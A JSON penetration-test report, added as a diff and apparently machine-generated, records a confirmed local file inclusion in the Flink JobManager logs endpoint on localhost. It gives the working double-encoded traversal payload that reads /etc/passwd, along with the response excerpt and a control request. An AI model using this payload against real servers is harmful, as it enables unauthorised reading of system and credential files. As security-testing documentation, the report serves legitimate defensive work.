@@ -1,0 +1,57 @@
+{
+  "id": "ed4bb198-45c3-4b02-ba56-2e8a0a60546b",
+  "engagement_name": "Flink file read",
+  "target_scope": [
+    "localhost",
+    "127.0.0.1"
+  ],
+  "test_start": "2026-07-18T13:02:09.657897Z",
+  "test_end": "2026-07-18T13:02:09.657897Z",
+  "generated_at": "2026-07-18T13:02:09.659070Z",
+  "executive_summary": {
+    "overview": "Penetration test of localhost, 127.0.0.1. 1 findings identified.",
+    "risk_rating": "High",
+    "critical_count": 0,
+    "high_count": 1,
+    "medium_count": 0,
+    "low_count": 0,
+    "info_count": 0,
+    "key_findings": [],
+    "recommendations": []
+  },
+  "hosts": [],
+  "findings": [
+    {
+      "id": "11e1953f-6ec1-4688-99ba-72722c4a4878",
+      "title": "Local File Inclusion in filename parameter",
+      "description": "Technique: WSTG-INPV-11. Parameter: filename.",
+      "severity": "high",
+      "status": "confirmed",
+      "target": "http://localhost:8081/jobmanager/logs/:filename",
+      "evidence": [
+        "Request: GET http://localhost:8081/jobmanager/logs/:filename \u2014 filename=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+        "Response: matched /etc/passwd signature: root:x:0:0:",
+        "phases_completed=6 verified=True strength=verified",
+        "retrieval_type=direct_read",
+        "primitives={'traversal_sequence': '%252e%252e%252f', 'wrapper_support': [], 'prefix_required': False, 'suffix_handling': 'appends_extension'}",
+        "payload=%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc/passwd",
+        "indicator_type=file_signature",
+        "expected_indicator=root:x:0:0:",
+        "indicator_observed=matched /etc/passwd signature: root:x:0:0:",
+        "confirmation=P3 target=GET http://localhost:8081/jobmanager/logs/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd (file read /etc/passwd) status=200",
+        "internal_content_marker='root:x:0:0:' (content we never sent; control_reflected_it=False)",
+        "confirming_excerpt: root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/\u2026",
+        "control [benign non-traversal filename 'clinkz_benign_control.txt' (no traversal \u2014 file-content signature absent)] status=404",
+        "control_excerpt: {\"errors\":[\"This file does not exist in JobManager log dir.\"]}"
+      ],
+      "cvss_score": null,
+      "cve_ids": [],
+      "references": [],
+      "remediation": "",
+      "discovered_at": "2026-07-18T13:01:30.313384Z",
+      "validated_at": null
+    }
+  ],
+  "methodology": "",
+  "appendices": {}
+}
